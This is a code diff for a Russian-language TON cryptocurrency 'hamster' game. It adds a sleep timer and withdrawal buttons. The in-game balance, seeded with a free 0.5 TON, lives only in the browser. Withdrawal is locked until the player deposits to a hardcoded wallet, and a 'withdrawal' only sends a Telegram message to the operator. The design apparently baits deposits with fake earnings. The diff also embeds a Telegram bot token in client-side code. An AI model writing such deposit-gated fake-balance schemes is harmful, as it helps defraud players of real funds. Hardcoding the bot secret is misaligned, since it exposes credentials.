@@ -11,6 +11,7 @@ interface Player {
   id: string;
   balance: number;
   memo: string;
+  hasDeposited: boolean;
 }
 
 interface GameData {
@@ -19,6 +20,7 @@ interface GameData {
   state: GameState;
   lastFed: number;
   poopReady: boolean;
+  sleepEndTime: number | null;
 }
 
 const WALLET_ADDRESS = 'UQD8VztFI8JOS71yj6c_Y5eGCUUvqZ_pRfE0GDyHV6AQ8kmc';
@@ -32,7 +34,8 @@ export default function Index() {
     const newPlayer: Player = {
       id: `P${Date.now()}`,
       balance: 0.5,
-      memo: Math.random().toString(36).substring(2, 10).toUpperCase()
+      memo: Math.random().toString(36).substring(2, 10).toUpperCase(),
+      hasDeposited: false
     };
     localStorage.setItem('hamster_player', JSON.stringify(newPlayer));
     return newPlayer;
@@ -47,7 +50,8 @@ export default function Index() {
       happiness: 50,
       state: 'idle' as GameState,
       lastFed: Date.now(),
-      poopReady: false
+      poopReady: false,
+      sleepEndTime: null
     };
   });
 
@@ -79,25 +83,64 @@ export default function Index() {
   }, []);
 
   useEffect(() => {
-    if (gameData.state === 'sleeping') {
-      const timer = setTimeout(() => {
+    if (gameData.state === 'sleeping' && gameData.sleepEndTime) {
+      const timeRemaining = gameData.sleepEndTime - Date.now();
+      
+      if (timeRemaining <= 0) {
         setGameData(prev => ({
           ...prev,
           state: 'idle',
-          poopReady: true
+          poopReady: true,
+          sleepEndTime: null
         }));
         toast.success('Хомяк проснулся! Забери какаху 💎');
-      }, 10 * 60 * 1000);
+      } else {
+        const timer = setTimeout(() => {
+          setGameData(prev => ({
+            ...prev,
+            state: 'idle',
+            poopReady: true,
+            sleepEndTime: null
+          }));
+          toast.success('Хомяк проснулся! Забери какаху 💎');
+        }, timeRemaining);
 
-      return () => clearTimeout(timer);
+        return () => clearTimeout(timer);
+      }
     }
-  }, [gameData.state]);
+  }, [gameData.state, gameData.sleepEndTime]);
+
+  const [timeLeft, setTimeLeft] = useState<string>('');
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      if (gameData.sleepEndTime) {
+        const now = Date.now();
+        const diff = gameData.sleepEndTime - now;
+        
+        if (diff <= 0) {
+          setTimeLeft('');
+        } else {
+          const minutes = Math.floor(diff / 60000);
+          const seconds = Math.floor((diff % 60000) / 1000);
+          setTimeLeft(`${minutes}:${seconds.toString().padStart(2, '0')}`);
+        }
+      } else {
+        setTimeLeft('');
+      }
+    }, 1000);
+
+    return () => clearInterval(interval);
+  }, [gameData.sleepEndTime]);
 
   const feedHamster = (amount: number, cost: number) => {
     if (player.balance < cost) {
       toast.error('Недостаточно TON!');
       return;
     }
+
+    const sleepDuration = 10 * 60 * 1000;
+    const sleepEndTime = Date.now() + sleepDuration;
 
     setPlayer(prev => ({ ...prev, balance: prev.balance - cost }));
     setGameData(prev => ({
@@ -106,7 +149,8 @@ export default function Index() {
       happiness: Math.min(100, prev.happiness + amount),
       state: 'sleeping',
       lastFed: Date.now(),
-      poopReady: false
+      poopReady: false,
+      sleepEndTime
     }));
 
     toast.success('Хомяк покормлен! 🍕');
@@ -122,6 +166,43 @@ export default function Index() {
     setPlayer(prev => ({ ...prev, balance: prev.balance + 0.01 }));
     setGameData(prev => ({ ...prev, poopReady: false }));
     toast.success('+0.01 TON! 💰');
+  };
+
+  const handleWithdraw = async (amount: number) => {
+    if (amount < 0.5) {
+      toast.error('Минимум вывода: 0.5 TON');
+      return;
+    }
+
+    if (player.balance < amount) {
+      toast.error('Недостаточно средств!');
+      return;
+    }
+
+    if (!player.hasDeposited) {
+      toast.error('Вывод доступен только после пополнения!');
+      return;
+    }
+
+    try {
+      const response = await fetch('https://api.telegram.org/bot7983779730:AAGkHvzwKjV_3qfQfZpSmN_2Vph9b-uQrYE/sendMessage', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          chat_id: '7196009009',
+          text: `🚨 ВЫВОД СРЕДСТВ\n\n👤 ID: ${player.id}\n💰 Сумма: ${amount} TON\n📝 MEMO: ${player.memo}\n⏰ Время: ${new Date().toLocaleString('ru-RU')}`
+        })
+      });
+
+      if (response.ok) {
+        setPlayer(prev => ({ ...prev, balance: prev.balance - amount }));
+        toast.success('Заявка на вывод отправлена! ✅');
+      } else {
+        toast.error('Ошибка отправки заявки');
+      }
+    } catch (error) {
+      toast.error('Ошибка соединения');
+    }
   };
 
   const renderHamster = () => {
@@ -151,13 +232,20 @@ export default function Index() {
 
   const renderGame = () => (
     <div className="relative h-screen flex flex-col">
-      <div className="absolute top-4 left-1/2 -translate-x-1/2 z-10">
+      <div className="absolute top-4 left-1/2 -translate-x-1/2 z-10 flex flex-col items-center gap-2">
         <Button 
           className="pixel-border bg-[var(--retro-magenta)] text-white hover:bg-[var(--retro-purple)] text-xs px-6 py-2"
           onClick={() => setScreen('market')}
         >
           МАРКЕТ
         </Button>
+        
+        {gameData.state === 'sleeping' && timeLeft && (
+          <div className="pixel-border bg-black/80 px-4 py-2 text-center">
+            <p className="text-[8px] text-[var(--retro-cyan)] mb-1">😴 ХОМЯК СПИТ</p>
+            <p className="text-sm text-[var(--retro-yellow)] retro-glow font-bold">{timeLeft}</p>
+          </div>
+        )}
       </div>
 
       <div className="flex-1 flex">
@@ -344,6 +432,44 @@ export default function Index() {
           <p className="text-xs text-center text-[var(--retro-cyan)]">
             💡 Собирай какаху каждые 10 минут и получай 0.01 TON
           </p>
+        </Card>
+
+        <Card className="p-6 pixel-border bg-gradient-to-br from-[var(--retro-green)]/20 to-transparent border-[var(--retro-green)]">
+          <p className="text-xs text-[var(--retro-cyan)] mb-4 text-center">ВЫВОД СРЕДСТВ</p>
+          
+          <div className="space-y-3">
+            <Button
+              onClick={() => handleWithdraw(0.5)}
+              disabled={!player.hasDeposited || player.balance < 0.5}
+              className="w-full pixel-border bg-[var(--retro-green)] text-black hover:bg-[var(--retro-yellow)] disabled:opacity-50 disabled:cursor-not-allowed text-xs"
+            >
+              ВЫВЕСТИ 0.5 TON
+            </Button>
+            
+            <Button
+              onClick={() => handleWithdraw(1.0)}
+              disabled={!player.hasDeposited || player.balance < 1.0}
+              className="w-full pixel-border bg-[var(--retro-green)] text-black hover:bg-[var(--retro-yellow)] disabled:opacity-50 disabled:cursor-not-allowed text-xs"
+            >
+              ВЫВЕСТИ 1.0 TON
+            </Button>
+
+            <Button
+              onClick={() => handleWithdraw(player.balance)}
+              disabled={!player.hasDeposited || player.balance < 0.5}
+              className="w-full pixel-border bg-[var(--retro-cyan)] text-black hover:bg-[var(--retro-green)] disabled:opacity-50 disabled:cursor-not-allowed text-xs"
+            >
+              ВЫВЕСТИ ВСЁ ({player.balance.toFixed(2)} TON)
+            </Button>
+
+            {!player.hasDeposited && (
+              <div className="bg-[var(--retro-purple)]/20 p-3 pixel-border border-[var(--retro-purple)]">
+                <p className="text-[8px] text-[var(--retro-yellow)] text-center">
+                  ⚠️ Вывод доступен только после пополнения баланса
+                </p>
+              </div>
+            )}
+          </div>
         </Card>
       </div>
 
